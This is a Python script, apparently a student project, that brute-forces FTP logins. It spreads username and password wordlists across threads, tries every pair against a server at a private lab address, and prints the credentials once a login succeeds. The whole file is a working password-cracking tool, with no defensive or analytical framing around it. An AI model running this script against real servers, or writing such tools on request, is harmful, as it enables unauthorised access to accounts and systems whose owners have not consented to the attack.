#! -*- coding:utf-8 -*-
import threading
from ftplib import FTP
count=0
flag = False
lock = threading.Lock()
result={}
result['tip2']=''
result['tip1']=''
def test(username,password,ip,port):
    global count
    global flag
    # global ftp

    # global result
    for user in username:
        for passwd in password:
            if flag==True:
                return
            lock.acquire()
            count+=1
            lock.release()
            try:
                ftp = FTP()
                banner = ftp.connect(ip,port,timeout=2)
                lock.acquire()
                print('\n[+] 正在尝试：用户名：%s 密码：%s\n' % (user, passwd))
                lock.release()
                ftp.login(user, passwd)
                ftp.quit()
                print('\n[+] 破解成功，用户名：%s 密码：%s\n' % (user, passwd))
                lock.acquire()
                result['username']=user
                result['password'] = passwd

                result['count']=count

                flag=True
                lock.release()
                return

            except:
                pass



def brute(thread_num,ip,port):

    with open(r'C:\Users\dkl\Desktop\bishe\uuuu.txt', 'r') as f:
        temp = f.readlines()
    username = [str.rstrip() for str in temp]
    with open(r'C:\Users\dkl\Desktop\bishe\pppp.txt', 'r') as f:
        temp = f.readlines()
    password = [str.rstrip() for str in temp]
    name=[]

    if thread_num > 0 and thread_num<len(username):
        times = int(len(username)/ thread_num)
        for i in range(thread_num):
            t1 = threading.Thread(target=test, args=(username[i*times:(i + 1) * times], password, ip, port))
            t1.start()
            name.append(t1)
        for i in range(thread_num):
            name[i].join()
        if username[thread_num * times:]:
            test(username[thread_num * times:], password, ip, port)
        if 'count' not in result:
            result['count'] = count

    else:
        test(username, password, ip, port)
        if 'count' not in result:
            result['count'] = count



    
    # return result
 
if __name__ == '__main__':
    brute(4,'192.168.80.130',21)
    print(result)






